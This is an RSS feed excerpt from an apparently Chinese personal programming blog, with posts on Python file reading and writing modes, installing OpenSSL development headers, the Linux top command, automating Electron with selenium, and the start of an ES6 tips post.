        <description>&lt;h2 id=&#34;1只读模式打开文件&#34;&gt;1.只读模式打开文件&lt;/h2&gt;
&lt;p&gt;打开一个文件用 &lt;code&gt;open()&lt;/code&gt; 方法，&lt;code&gt;open()&lt;/code&gt;会返回一个可迭代的文件对象：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; f = open(&#39;test.txt&#39;, &#39;r&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;r 表示是文本文件，rb 是二进制文件，函数默认值就是 r&lt;/p&gt;
&lt;p&gt;如果文件不存在，&lt;code&gt;open()&lt;/code&gt;函数就会抛出一个 &lt;code&gt;IOError&lt;/code&gt; 的错误，并且给出错误码和详细的信息告诉你文件不存在：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; f=open(&#39;test.txt&#39;, &#39;r&#39;)
Traceback (most recent call last):
  File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
FileNotFoundError: [Errno 2] No such file or directory: &#39;test.txt&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;文件使用完毕后必须关闭，因为文件对象会占用操作系统的资源，并且操作系统同一时间能打开的文件数量也是有限的&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; f.close()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于文件读写时都有可能产生&lt;code&gt;IOError&lt;/code&gt;，一旦出错，后面的&lt;code&gt;f.close()&lt;/code&gt;就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，Python 引入了&lt;code&gt;with&lt;/code&gt;语句来自动帮我们调用&lt;code&gt;close()&lt;/code&gt;方法：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;with open(&#39;/path/to/file&#39;, &#39;r&#39;) as f:
    print(f.read())
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2读取文件&#34;&gt;2.读取文件&lt;/h2&gt;
&lt;p&gt;python 文件对象提供了三个读方法： &lt;code&gt;read()、readline()、readlines()&lt;/code&gt;，每种方法可以接受一个变量以限制每次读取的数据量。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;read()&lt;/code&gt;会读取整个文件，并将文件内容放到一个字符串变量中。注意，如果文件大于可用内存，则程序可能会报错，因此，为了保险起见，可以通过调用&lt;code&gt;read(size)&lt;/code&gt;方法，指定每次最多读取 size 个字节的内容。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;readlines()&lt;/code&gt; 会读取整个文件，像&lt;code&gt;read()&lt;/code&gt;一样，但是&lt;code&gt;readlines()&lt;/code&gt;会自动将文件内容分析成一个行的列表，该列表可以进行迭代。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;readline()&lt;/code&gt;每次只读取一行，并将结果放入一个字符串变量中。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;PS：上述三种方法都会把每行末尾的&lt;code&gt;\n&lt;/code&gt;也一并读取。&lt;/p&gt;
&lt;h2 id=&#34;3写入模式打开文件&#34;&gt;3.写入模式打开文件&lt;/h2&gt;
&lt;p&gt;写文件和读文件是一样的，唯一区别是调用&lt;code&gt;open()&lt;/code&gt;函数时，需要传入标识符&lt;code&gt;&#39;w&#39;&lt;/code&gt;或者&lt;code&gt;&#39;wb&#39;&lt;/code&gt;表示写文本文件或写二进制文件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; f = open(&#39;test.txt&#39;, &#39;w&#39;) # 若是&#39;wb&#39;就表示写二进制文件
&amp;gt;&amp;gt;&amp;gt; f.write(&#39;Hello, world!&#39;)
&amp;gt;&amp;gt;&amp;gt; f.close()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PS：&lt;code&gt;&#39;w&#39;&lt;/code&gt;模式打开文件时，如果路径没有这个文件，程序就会自动创建一个；如果有，那么程序会把原文件的内容清空后再写入新的东西。如果不想清空原来的内容而是直接在后面追加新的内容，需要使用&lt;code&gt;&#39;a&#39;&lt;/code&gt;模式。&lt;/p&gt;
&lt;p&gt;我们可以反复调用&lt;code&gt;write()&lt;/code&gt;来写入文件，但是务必调用&lt;code&gt;f.close()&lt;/code&gt;来关闭文件。因为当我们写文件时，系统往往不会立刻把数据写入磁盘，而是放到内存缓存起来，等到空闲时再慢慢写入。只有调用&lt;code&gt;close()&lt;/code&gt;方法时，系统才保证把没有写入的数据全部写入磁盘。&lt;/p&gt;
&lt;h2 id=&#34;4写入文件&#34;&gt;4.写入文件&lt;/h2&gt;
&lt;p&gt;python文件对象提供了两个写方法： &lt;code&gt;write()、writelines()&lt;/code&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;write()&lt;/code&gt;方法和&lt;code&gt;read()、readline()&lt;/code&gt;方法对应，是将字符串写入到文件中。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;writelines()&lt;/code&gt;方法和&lt;code&gt;readlines()&lt;/code&gt;方法对应，也是针对列表的操作。它接收一个字符串列表作为参数，将他们写入到文件中。注意的是，&lt;code&gt;writelines()&lt;/code&gt;不会自动加入换行符，因此，需要显式加入。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5关于open的mode参数&#34;&gt;5.关于&lt;code&gt;open()&lt;/code&gt;的mode参数&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;r&#39;&lt;/code&gt;：读&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;w&#39;&lt;/code&gt;：写&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;a&#39;&lt;/code&gt;：追加&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;r+&#39; == r+w&lt;/code&gt;：（可读可写，文件若不存在就报错(IOError)）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;w+&#39; == w+r&lt;/code&gt;：（可读可写，文件若不存在就创建）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;a+&#39; ==a+r&lt;/code&gt;：（可追加可写，文件若不存在就创建）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;PS：如果是二进制文件，只需在后面添加&lt;code&gt;b&lt;/code&gt;，&lt;code&gt;&#39;rb&#39;　　&#39;wb&#39;　　&#39;ab&#39;　　&#39;rb+&#39;　　&#39;wb+&#39;　　&#39;ab+&#39;&lt;/code&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUG—Linux 缺少 OpenSSL</title>
        <link>https://ac-lm.github.io/posts/bug/buglinux-%E7%BC%BA%E5%B0%91-openssl/</link>
        <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/buglinux-%E7%BC%BA%E5%B0%91-openssl/</guid>
        <description>&lt;h2 id=&#34;bug描述&#34;&gt;BUG描述&lt;/h2&gt;
&lt;p&gt;在 Linux 编译某些软件时，会出现报错&lt;/p&gt;
&lt;p&gt;&lt;code&gt;fatal error: openssl/ssl.h: No such file or directory centos&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;这是缺少 OpenSSL 导致的，重新安装即可&lt;/p&gt;
&lt;p&gt;要在 Debian、Ubuntu 或者其他衍生版上安装 OpenSSL：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo apt-get install libssl-dev
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;要在 Fedora，CentOS 或者 RHEL 上安装 OpenSSL：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo yum install openssl-devel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;安装完后，尝试重新编译程序&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Linux—Top 命令详解</title>
        <link>https://ac-lm.github.io/posts/linux/linuxtop-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</link>
        <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxtop-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</guid>
        <description>&lt;h2 id=&#34;1top-命令的用法&#34;&gt;1.top 命令的用法&lt;/h2&gt;
&lt;p&gt;top 命令常用于监控 linux 的系统状况，是常用的性能分析工具，能够实时显示系统中各个进程的资源占用情况，其使用格式如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;top &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-d number&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# -d：top命令显示的页面更新一次的间隔,单位秒。&lt;/span&gt;
top &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-bnp&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# -b：以批次的方式执行top。 -n：与-b配合使用，表示需要进行几次top命令的输出结果。 -p：指定特定的pid进程观察。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 top 命令运行时，用户还可以输入以下按键执行相应的功能（注意区分大小写）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;?：显示在top当中可以输入的命令&lt;/li&gt;
&lt;li&gt;P：以CPU的使用资源排序显示&lt;/li&gt;
&lt;li&gt;M：以内存的使用资源排序显示&lt;/li&gt;
&lt;li&gt;N：以 pid 排序显示&lt;/li&gt;
&lt;li&gt;T：由进程使用的时间累计排序显示&lt;/li&gt;
&lt;li&gt;k：给某一个 pid 一个信号，杀死进程&lt;/li&gt;
&lt;li&gt;r：给某个pid重新定制一个 nice 值（即优先级）&lt;/li&gt;
&lt;li&gt;q：退出top（或 Ctrl+C）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2top各输出的含义&#34;&gt;2.top各输出的含义&lt;/h2&gt;
&lt;h3 id=&#34;第1行&#34;&gt;第1行&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;top - 05:43:27 up 4:52, 2 users, load average: 0.58, 0.41, 0.30&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;05:43:27&lt;/td&gt;
&lt;td&gt;系统当前时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;up 4:52&lt;/td&gt;
&lt;td&gt;系统运行时间，格式为时：分&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2 users&lt;/td&gt;
&lt;td&gt;当前登录用户数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;load average: 0.58, 0.41, 0.30&lt;/td&gt;
&lt;td&gt;系统负载，即任务队列的平均长度。 三个数值分别为 1分钟、5分钟、15分钟前到现在的平均值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;第2行&#34;&gt;第2行&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Tasks: 746 total,   1 running, 745 sleeping,   0 stopped,   0 zombie&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Tasks&lt;/td&gt;
&lt;td&gt;任务队列信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;total&lt;/td&gt;
&lt;td&gt;总&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;running&lt;/td&gt;
&lt;td&gt;运行中&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sleeping&lt;/td&gt;
&lt;td&gt;睡眠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;stopped&lt;/td&gt;
&lt;td&gt;停止&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zombie&lt;/td&gt;
&lt;td&gt;僵尸进程&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;第3行&#34;&gt;第3行&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;%Cpu(s): 37.0 us, 3.7 sy, 0.0 ni, 59.3 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;%Cpu(s)&lt;/td&gt;
&lt;td&gt;CPU信息，(s)表示不止一个，多个CPU&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;us&lt;/td&gt;
&lt;td&gt;用户空间占用CPU百分比&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sy&lt;/td&gt;
&lt;td&gt;内核空间占用CPU百分比&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ni&lt;/td&gt;
&lt;td&gt;用户进程空间内改变过优先级的进程占用CPU百分比&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;id&lt;/td&gt;
&lt;td&gt;空闲CPU百分比&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;wa&lt;/td&gt;
&lt;td&gt;等待输入输出的CPU时间百分比&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hi&lt;/td&gt;
&lt;td&gt;硬中断（Hardware IRQ）占用CPU的百分比&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;si&lt;/td&gt;
&lt;td&gt;软中断（Software Interrupts）占用CPU的百分比&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;st&lt;/td&gt;
&lt;td&gt;系统花费百分之多少时间等待真正的cpu资源。该参量常用于虚拟化系统上，在正常情况下虚拟机的st最好为0，这表明你的虚拟机得到了所有必要的cpu资源，在使用时不用等待。如果这个值为50，则表明你的虚拟机在运行时有一半时间在等待CPU，存在其他虚拟机与你竞争资源。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;第4行&#34;&gt;第4行&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;KiB Mem :  7990288 total,  3173076 free,  2748968 used,  2068244 buff/cache&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;KiB Mem&lt;/td&gt;
&lt;td&gt;物理内存信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;total&lt;/td&gt;
&lt;td&gt;物理内存总量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;free&lt;/td&gt;
&lt;td&gt;使用的物理内存总量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;used&lt;/td&gt;
&lt;td&gt;空闲内存总量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;buff/cache&lt;/td&gt;
&lt;td&gt;用作内核缓存的内存量&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;第5行&#34;&gt;第5行&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;KiB Swap:  8257532 total,  8257532 free,        0 used.  4615016 avail Mem&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;KiB Swap&lt;/td&gt;
&lt;td&gt;硬盘交换内存、虚拟内存&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;total&lt;/td&gt;
&lt;td&gt;总量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;free&lt;/td&gt;
&lt;td&gt;空闲&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;used&lt;/td&gt;
&lt;td&gt;使用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;avail Mem&lt;/td&gt;
&lt;td&gt;可用于进程下一次分配的内存数量&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;PS：计算可用内存数公式： 第四行的 free + 第四行的 buffers + 第五行的 avail Mem&lt;/p&gt;
&lt;h2 id=&#34;3top进程信息&#34;&gt;3.top进程信息&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;PID&lt;/td&gt;
&lt;td&gt;进程id&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;USER&lt;/td&gt;
&lt;td&gt;进程所有者&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PR&lt;/td&gt;
&lt;td&gt;优先级&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;NI&lt;/td&gt;
&lt;td&gt;nice 值，负值表示高优先级，正值表示低优先级&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;VIRT&lt;/td&gt;
&lt;td&gt;进程使用的虚拟内存总量，单位kb，VIRT=SWAP+RES&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RES&lt;/td&gt;
&lt;td&gt;进程使用的、未被换出的物理内存大小，单位kb，RES=CODE+DATA&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SHR&lt;/td&gt;
&lt;td&gt;共享内存大小，单位kb&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;S&lt;/td&gt;
&lt;td&gt;进程状态，D=不可中断的睡眠状态，R=运行，S=睡眠，T=跟踪/停止，Z=僵尸进程&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%CPU&lt;/td&gt;
&lt;td&gt;进程使用的CPU时间占用百分比&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%MEM&lt;/td&gt;
&lt;td&gt;进程使用的物理内存百分比&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TIME+&lt;/td&gt;
&lt;td&gt;进程运行时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;COMMAND&lt;/td&gt;
&lt;td&gt;命令名/命令行&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;4其他&#34;&gt;4.其他&lt;/h2&gt;
&lt;h3 id=&#34;监控每个逻辑cpu的状况&#34;&gt;监控每个逻辑CPU的状况&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;在top基本视图中按 1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;触发粗体显示&#34;&gt;触发粗体显示&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按 b
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;显示完整命令&#34;&gt;显示完整命令&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按 c
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;切换显示cpu&#34;&gt;切换显示CPU&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按t
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;按cpu使用率从大到小排序&#34;&gt;按CPU使用率从大到小排序&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按P
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;切换显示memory&#34;&gt;切换显示Memory&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按m
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;按memory占用率从大到小排序&#34;&gt;按Memory占用率从大到小排序&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按M
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;按累计运行时间time从大到小排序&#34;&gt;按累计运行时间Time从大到小排序&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按T
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;高亮cpu列&#34;&gt;高亮CPU列&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按x 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;彩色高亮显示&#34;&gt;彩色高亮显示&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按z
按shift+z 可以调配色方案
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;向右或左改变排序列&#34;&gt;向右或左改变排序列&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;shift + &amp;gt;或shift + &amp;lt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;忽略闲置和僵死进程&#34;&gt;忽略闲置和僵死进程&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按i 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;杀掉进程&#34;&gt;杀掉进程&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按k，输入PID
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;改变内存的显示单位默认为kb&#34;&gt;改变内存的显示单位，默认为KB&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;按e （针对列表）
按E （针对头部统计信息）
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;高亮&#34;&gt;高亮&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&#39;x&#39;将排序字段高亮显示（纵列）
&#39;y&#39;将运行进程高亮显示（横行）
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;刷新时间&#34;&gt;刷新时间&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-d: 设置延迟间隔
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;指定进程&#34;&gt;指定进程&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-p: 监控特定的PID
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Python—selenium 自动化 Electron</title>
        <link>https://ac-lm.github.io/posts/python/pythonselenium-%E8%87%AA%E5%8A%A8%E5%8C%96-electron/</link>
        <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonselenium-%E8%87%AA%E5%8A%A8%E5%8C%96-electron/</guid>
        <description>&lt;h2 id=&#34;1原理&#34;&gt;1.原理&lt;/h2&gt;
&lt;p&gt;Electron 是一个基于 Node.js 和 Chromium 的开源框架，由于 Chromium 是谷歌浏览器的内核，因此我们可以把 Electron 看做是一个特别的浏览器。既然是浏览器，那显然可以使用 webdriver 对其进行控制，在 Python 中通过 selenium 实现对 Electron 的自动化测试。&lt;/p&gt;
&lt;h2 id=&#34;2实现&#34;&gt;2.实现&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; selenium &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; webdriver

options &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; webdriver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ChromeOptions()
options&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary_location &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/Applications/Electron.app/Contents/MacOS/Electron&amp;#34;&lt;/span&gt;
driver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; webdriver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Chrome(options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;options, executable_path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chromedriver.exe&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# t = driver.find_elements_by_css_selector(&amp;#34;.el-input__inner&amp;#34;)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# t[0].send_keys(&amp;#39;123456&amp;#39;)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# t[1].send_keys(&amp;#39;123456&amp;#39;)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# sleep(3)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# driver.find_element_by_css_selector(&amp;#34;.submit-item button&amp;#34;).click()&lt;/span&gt;

driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;quit()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Web开发—杂项1</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E6%9D%82%E9%A1%B91/</link>
        <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E6%9D%82%E9%A1%B91/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://juejin.cn/post/6995334897065787422&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; ES6-ES12的开发技巧 @Sunshine_Lin &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;es6&#34;&gt;ES6&lt;/h1&gt;
&lt;h2 id=&#34;1let--和-const&#34;&gt;1.let  和 const&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;var&lt;/code&gt;：有变量提升，值可变，允许重复声明&lt;/li&gt;
&lt;li&gt;&lt;code&gt;let&lt;/code&gt;：没有变量提升，值可变，不允许重复声明&lt;/li&gt;
&lt;li&gt;&lt;code&gt;const&lt;/code&gt;：没有变量提升，值不可变，但如果是定义对象，则属性可变&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// let 无变量提升
